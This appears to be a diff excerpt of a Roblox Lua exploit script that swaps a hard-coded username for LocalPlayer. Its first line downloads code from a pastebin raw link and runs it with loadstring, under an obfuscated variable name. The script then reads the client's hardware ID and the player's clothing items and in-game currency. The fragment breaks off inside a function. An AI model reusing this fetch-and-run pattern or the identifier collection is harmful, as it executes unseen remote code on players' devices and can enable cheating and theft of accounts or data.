@@ -1,8 +1,8 @@
 local asdachsfasdfaeckdasdasdafasdd = loadstring(game:HttpGet('https://pastebin.com/raw/sg3se9hA'))()
 local hwid =  game:GetService("RbxAnalyticsService"):GetClientId()
 
-local clamount = game:GetService("Players").AnnaKaira222.Odezda:GetChildren()
-local money = game:GetService("Players").AnnaKaira222.leaderstats.Rub
+local clamount = game:GetService("Players").LocalPlayer.Odezda:GetChildren()
+local money = game:GetService("Players").LocalPlayer.leaderstats.Rub
 
 local success, response = pcall(function()
     
